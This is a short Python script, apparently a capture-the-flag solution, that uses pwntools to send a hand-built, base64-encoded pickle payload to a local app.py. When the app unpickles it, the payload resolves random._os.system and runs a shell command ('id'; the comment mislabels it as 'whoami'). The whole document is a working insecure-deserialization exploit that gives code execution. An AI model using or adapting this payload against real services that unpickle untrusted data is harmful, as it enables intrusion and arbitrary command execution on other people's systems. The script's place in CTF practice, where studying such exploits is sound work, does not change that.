from base64 import b64encode
from pwn import *

# reference link : https://github.com/sasdf/ctf/blob/master/tasks/2019/BalsnCTF/misc/pyshv1/_files/solution/solve.py
payload = b"\x80\x04" # Protocol 4 Settings
payload += b"capp\nrandom._os.system\n"
payload += b"X\x02\x00\x00\x00id\x85R" # app.random._os.system("whoami") Call
payload += b"." # end
payload = b64encode(payload)

p = process(["python3", "app.py"])
p.sendlineafter(b"> ", b"2")
p.sendlineafter(b"Enter new member data: ", payload)
p.sendlineafter(b"> ", b"1")

for _ in range(2):
        p.recv()

print("output:", p.recv()[:-1])